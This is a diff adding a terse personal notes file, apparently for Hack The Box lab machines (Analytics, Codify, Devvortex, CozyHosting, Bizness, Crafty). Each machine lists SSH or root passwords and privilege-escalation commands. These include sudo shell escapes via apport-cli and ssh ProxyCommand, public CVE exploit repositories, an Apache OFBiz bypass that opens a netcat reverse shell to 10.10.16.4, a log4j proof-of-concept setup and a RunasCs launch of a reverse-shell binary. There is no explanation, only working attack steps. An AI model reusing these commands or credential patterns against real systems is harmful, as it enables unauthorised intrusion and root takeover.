@@ -1,0 +1,46 @@
+Analytics
+ssh metalytics@10.10.11.233
+password: An4lytics_ds20223#
+priv:
+https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629
+./exploit.sh
+
+Codify
+ssh joshua@10.10.11.239
+password: spongebob1
+priv:
+su root
+password: kljh12k3jhaskjh12kjh3
+
+Devvortex
+ssh logan@10.10.11.242
+password: tequieromucho
+priv:
+sudo /usr/bin/apport-cli --file-bug
+1
+2
+V
+!/bin/bash
+
+CozyHosting
+ssh josh@10.10.11.230
+password: manchesterunited
+priv:
+sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+
+Bizness
+https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
+nc -lvnp 1234
+python3 exploit.py --url https://bizness.htb/ --cmd 'nc 10.10.16.4 1234 -e /bin/bash'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+su root
+password: monkeybizness
+
+
+Crafty
+https://github.com/kozmer/log4j-shell-poc
+wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
+tar -xf jdk-8u181-linux-x64.tar.gz
+git clone https://github.com/will890731/pyCraft.git
+https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
+RunasCs.exe Administrator s67u84zKq8IXw revAdmin.exe
